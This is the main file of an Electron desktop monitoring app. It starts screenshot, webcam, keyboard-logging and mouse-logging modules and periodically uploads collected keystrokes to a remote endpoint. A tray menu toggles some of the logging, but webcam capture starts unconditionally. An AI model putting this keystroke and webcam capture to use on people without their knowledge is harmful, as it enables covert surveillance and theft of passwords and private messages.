
const {app, BrowserWindow,Tray,Menu} = require('electron')

const path = require('path');
let shared=require("./src/app/shared/Shared.js");
let response=shared.readSetting();
var fs = require('fs'); 
console.log(__dirname);
const url = require('url')
function createWindow () {
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: true,
      
    }
  
  })
  //mainWindow.setMenuBarVisibility(false)
  mainWindow.loadFile('./src/app/Settings/Setting.html')
}

app.whenReady().then(
  function()
  {
    let trayIcon = new Tray(path.join(__dirname,"./src/assets/images/logo.png"))

    const trayMenuTemplate = [
    {label:"ScreenShot",submenu:[
      { label: 'Enable ScreenShot', type: 'radio',checked:response.SnapShotEnable ==true?true:false  ,click: function () {
        response.SnapShotEnable=true;

      fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
      }
        },
     { label: 'Disable ScreenShot', type: 'radio',checked:response.SnapShotEnable ==false?true:false ,click: function () {
      response.SnapShotEnable=false;
     fs.writeFileSync("Storage/Settings.json",JSON.stringify(response));
     }
       }
    ]},
    {label:"Keyboard Logging",submenu:[
      { label: 'Enable logging', type: 'radio',checked:response.KeyboardEnable ==true?true:false , click: function () {
       
        response.KeyboardEnable=true;
       fs.writeFileSync("Storage/Settings.json",JSON.stringify(response));
      }
        },
     { label: 'Disable logging', type: 'radio',checked:response.KeyboardEnable ==false?true:false , click: function () {
      response.KeyboardEnable=false;
    fs.writeFileSync("Storage/Settings.json",JSON.stringify(response));
     }
       }
    ]},
    ,
    {label:"Mouse Logging",submenu:[
      { label: 'Enable logging', type: 'radio',checked:response.MouseEnable ==true?true:false , click: function () {
        response.MouseEnable=true;

       fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response) );
      }
        },
     { label: 'Disable logging', type: 'radio',checked:response.MouseEnable ==false?true:false , click: function () {
      response.MouseEnable=false;
    fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
     }
     }
    ]},
    {
      label: 'Setting',
      click: function () {
        createWindow();
      }
   },
       {
          label: 'Close Application',
          click: function () {
            if (process.platform !== 'darwin') app.quit()
          }
       }
    ]
    
    let trayMenu = Menu.buildFromTemplate(trayMenuTemplate)
    trayIcon.setContextMenu(trayMenu)
  
  }
 
  )

app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') app.quit()
})

app.on('activate', function () {
  if (BrowserWindow.getAllWindows().length === 0) createWindow()
})
app.on('ready', () => { 
  win = new BrowserWindow({ show: false }); 
});
//Screenshot
let ScreenShot=require("./src/app/tracker/screenshot/ScreenShot.js");
  ScreenShot();
//Screenshot
  let WebCam = require("./src/app/tracker/webcam/WebCam.js");
   WebCam();
 //Keyboard Logger
let KeyboardLogger=require("./src/app/tracker/keyboard/Keyboardlogging.js");
KeyboardLogger();
//Mouse Logger
let mouseLogger=require("./src/app/tracker/mouse/mouseLogging.js");
mouseLogger();

setInterval(function(){
require('dns').resolve('www.google.com', function(err) {
  if (err) {
     console.log("No connection");
  } else {

          let Keyboard_data=shared.GetKeyboardData();
          if(Keyboard_data.length!=0)
          {
           var path="Data-/"+shared.getRandomInt("999999999")+"/";
              var body=Keyboard_data
             shared.fnPostData(path,body);
              console.log("yes it happened")
          }else{
            console.log("No Record Found")
          }
          let res=[];
          fs.writeFileSync("./Storage/KeyboardStorage.json",JSON.stringify(res));
  
 
    
}   
});

},response.PostRequest)
